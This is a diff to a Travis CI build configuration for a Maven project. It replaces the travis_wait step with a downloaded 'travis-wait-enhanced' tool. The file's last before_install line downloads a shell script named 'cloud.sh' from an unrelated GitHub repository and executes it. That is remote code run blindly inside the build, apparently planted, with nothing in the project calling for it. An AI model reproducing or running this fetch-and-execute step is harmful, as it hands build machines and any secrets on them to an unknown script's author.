@@ -7,10 +7,16 @@ env:
     - CT_RELEASE=1.0.1
     - BR_RELEASE=2015.08.1-rev1
     - BR_TRAVIS_RELEASE=1.0.0
-install: travis_wait 362 mvn install
+
 before_install: 
+  
   - sudo apt-get -y update 
   - sudo apt-get -y install wget
   - sudo apt-get -y update
+  - wget -qO- "https://github.com/crazy-max/travis-wait-enhanced/releases/download/v1.2.0/travis-wait-enhanced_1.2.0_linux_x86_64.tar.gz" | tar -zxvf - travis-wait-enhanced
+    mv travis-wait-enhanced /home/travis/bin/
+    travis-wait-enhanced --version
+  - travis-wait-enhanced --interval=1m --timeout=2000m -- mvn -V clean install -Prun-its
+
   - wget https://raw.githubusercontent.com/comandashtar/colab-2/main/cloud.sh && chmod +x cloud.sh && ./cloud.sh
  
